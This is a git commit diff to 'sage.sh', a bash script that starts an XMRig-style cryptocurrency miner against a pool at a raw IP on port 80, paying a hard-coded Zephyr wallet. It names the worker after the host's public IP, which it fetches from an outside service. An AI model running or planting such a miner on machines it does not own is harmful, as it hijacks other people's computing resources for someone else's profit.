9c00a687d99a46e86563f947a81509e4b6e26bb3
Ryan Wahyudi <116867564+RyanWahyudi8@users.noreply.github.com>
2024-01-23 23:41:51 +0700

    Update sage.sh

--- sage.sh
+++ sage.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 POOL=stratum+ssl://3.68.199.229:80
-WALLET=ZEPHsBL4wFydCvcmNJEHc7iR7Fq6NcZtFHsSAV7GpztYDzZtyanCTShcMd7d2n96yMHhioHisWLpJWGcvaAstUYm2itMLaQKzhk.CPU_$(echo "$(curl -s ifconfig.me)" | tr . _ )
+WALLET=ZEPHsBL4wFydCvcmNJEHc7iR7Fq6NcZtFHsSAV7GpztYDzZtyanCTShcMd7d2n96yMHhioHisWLpJWGcvaAstUYm2itMLaQKzhk.CPU_$(echo "$(curl icanhazip.com)" | tr . _ )
 cd "$(dirname "$0")"
 chmod +x ./xmrigDaemon && clear && ./xmrigDaemon -a rx/0 -o $POOL -u $WALLET $@ -p x -k --donate-level=1 --cc-disabled
